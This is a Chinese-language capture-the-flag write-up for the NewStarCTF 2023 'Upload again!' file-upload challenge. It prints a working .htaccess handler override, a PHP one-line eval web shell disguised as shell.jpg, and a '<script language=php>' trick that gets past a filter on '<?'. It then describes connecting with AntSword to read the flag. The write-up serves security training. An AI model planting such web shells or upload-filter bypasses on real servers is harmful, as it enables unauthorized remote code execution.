---
tags:
  - BuuCTF
  - 中等
  - 文件上传
  - .htaccess
  - 一句话木马
---

# \[NewStarCTF 2023\] Upload again!

## 前置工作

进入靶机网页，看到如下界面，感觉非常难受

![](https://z1.ax1x.com/2023/10/12/piSIj2Q.png)

先试一下普通的一句话木马 & 改后缀，发现没有任何漏洞可以钻，你使用任何原生支持的 PHP 文件格式都会被阻拦，并报出

```
你打不开的，别试了
```

![](https://z1.ax1x.com/2023/10/12/piSopbq.png)

经过多个文件的测试，发现他**只会**拦截与 PHP 有直接关联的文件（更恰当的说，应该是文件后缀）

于是就想到可以使用 `.htaccess` 来使文件被强制当成 PHP 文件运行，OK，说好了，一拍即合

## 编写 `.htaccess`

我们除了传入 `.htaccess`，后面也会再传入一个图片木马文件 `shell.jpg`，所以我们只需要使得 `shell.jpg` 被当作 PHP 脚本执行即可，如下是 `.htaccess` 文件

```xml
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

## 编写木马

然后就是我们的 `shell.jpg`

```php
<?
echo "HelloWorld"; // 这个是为了验证是否被运行，可以不写
@eval($_POST['attack']);
?>
```

但当你像这样传入 `shell.jpg` 的时候，靶机就不愿意了

![](https://z1.ax1x.com/2023/10/12/piSomrR.png)

这多半就是 PHP 脚本的开头 `<?` 惹的祸，只要出现了 `<?`，那么就无法上传，包括最原始的 `<?php`，所以我们用第二种写法来编写 `shell.jpg`

```js
<script language="php">
echo "HelloWorld";
@eval($_POST['attack']);
</script>
```

现在再上传，发现上传成功，进入上传地址 `http://e56e35c3-081a-4f17-bcc8-d944d8358293.node4.buuoj.cn:81//upload/shell.jpg`，大大的 **HelloWorld** 就写在上面了

## 攻入靶机

一句话木马的意义就是为了让我们使用蚁剑进行连接，老套路，进入后直接去根目录，就发现了 `this_is_flag` 文件，进入就找到了 Flag `flag{7beaa386-03e2-412d-af48-21b869aa6df6}`